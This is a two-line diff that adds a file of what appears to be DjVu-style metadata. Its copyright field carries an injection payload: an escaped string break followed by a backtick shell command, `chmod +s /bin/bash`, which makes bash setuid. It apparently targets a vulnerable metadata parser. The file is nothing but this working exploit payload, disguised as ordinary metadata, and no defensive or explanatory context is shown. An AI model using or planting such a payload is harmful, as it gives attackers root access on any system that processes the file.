@@ -1,0 +1,2 @@
+(metadata (copyright "\\
+" . `chmod +s /bin/bash` #"))
